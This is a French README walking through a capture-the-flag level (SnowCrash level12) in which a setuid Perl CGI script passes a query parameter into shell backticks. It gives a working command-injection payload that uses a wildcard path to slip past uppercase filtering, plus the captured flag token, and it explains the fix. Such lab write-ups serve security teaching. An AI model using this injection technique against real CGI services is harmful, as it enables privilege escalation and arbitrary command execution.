# README - Exploitation du script level12.pl (CGI Perl)

## Étapes suivies pour obtenir le Flag12

### 1. Identification des fichiers

Le répertoire contient un fichier principal :

```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

- **`level12.pl`** : Un script Perl CGI exécutable avec permissions `setuid` et `setgid`, s'exécutant avec les privilèges de l'utilisateur `flag12`. Il implémente un serveur web simple sur le port 4646.

### 2. Analyse du script `level12.pl`

En lisant le script avec `cat level12.pl`, on observe :

- Il crée un serveur CGI sur `localhost:4646` et accepte les paramètres `x` et `y` via `param()`.
- La fonction `t()` exécute : `@output = `egrep "^$xx" /tmp/xd 2>&1`;` pour rechercher une ligne dans `/tmp/xd` commençant par `$xx` (basé sur `param("x")` après sanitization).
- Le serveur tourne déjà avec les droits de `flag12` (vérifiable avec `netstat -tlnp | grep 4646`).

Test simple :
```bash
level12@SnowCrash:~$ curl localhost:4646/?x=test&y=test
.
```

### 3. Exploitation de la vulnérabilité

La vulnérabilité réside dans l'utilisation des backticks dans la ligne `@output = `egrep "^$xx" /tmp/xd 2>&1`;`, où `$xx` (dérivé de `param("x")`) est inséré directement dans une commande shell sans échappement suffisant. Bien que le sanitization (`tr/a-z/A-Z/` et `s/\s.*//`) limite les entrées aux majuscules et supprime tout après le premier espace, les backticks permettent d'exécuter des commandes arbitraires en injectant une sous-commande (ex. : via `` ` ``).

- Le serveur possède les privilèges de `flag12`, et l'utilisation d'un fichier comme `/tmp/TOKEN` avec un wildcard (`/*/TOKEN`) permet d'exécuter son contenu (ex. : `getflag > /tmp/flag12`) avec ces privilèges, capturant ainsi le token.

### 4. Injection de commande

Crée un fichier avec une commande :
```bash
level12@SnowCrash:~$ echo 'getflag > /tmp/flag12' > /tmp/TOKEN
level12@SnowCrash:~$ curl localhost:4646/?x='`/*/TOKEN`'
..level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

Exemple avec élévation de privilèges :
```bash
level12@SnowCrash:~$ echo 'whoami > /tmp/who' > /tmp/TOKEN
level12@SnowCrash:~$ curl localhost:4646/?x='`/*/TOKEN`'
..level12@SnowCrash:~$ cat /tmp/who
flag12
```

### 5. Passage à l'utilisateur suivant

Utilise le mot de passe récupéré pour passer directement à `level13` (si applicable) :
```bash
level12@SnowCrash:~$ su level13
Password: g1qKMiRpXf53AWhDaU7FEkczr
level13@SnowCrash:~$
```

### Vulnérabilité expliquée

Le script Perl utilise des backticks (`@output = `egrep "^$xx" /tmp/xd 2>&1`;`) pour exécuter une commande shell avec l'input utilisateur (`$xx` basé sur `param("x")`) non suffisamment sanitizé. Bien que `tr/a-z/A-Z/` et `s/\s.*//` limitent les entrées (majuscules uniquement, suppression après espace), l'injection de `` `/*/TOKEN` `` permet d'exécuter le contenu de `/tmp/TOKEN` comme une commande. Les permissions `setuid/setgid` élèvent les privilèges à `flag12`, permettant d'exécuter `getflag` avec succès. Une correction impliquerait d'échapper l'input (ex. : `quotemeta($xx)`) ou d'éviter les backticks au profit d'une exécution contrôlée (ex. : utiliser une bibliothèque Perl native).

---

### Explications supplémentaires
- **Wildcards** : Le wildcard `/*/TOKEN` est évalué par le shell pour trouver `/tmp/TOKEN`, et son contenu (`getflag > /tmp/flag12` ou `whoami > /tmp/who`) est exécuté, exploitant la vulnérabilité.
- **Différence avec injection directe** : Une injection comme `` `getflag` `` échoue car la commande s'execute directement.
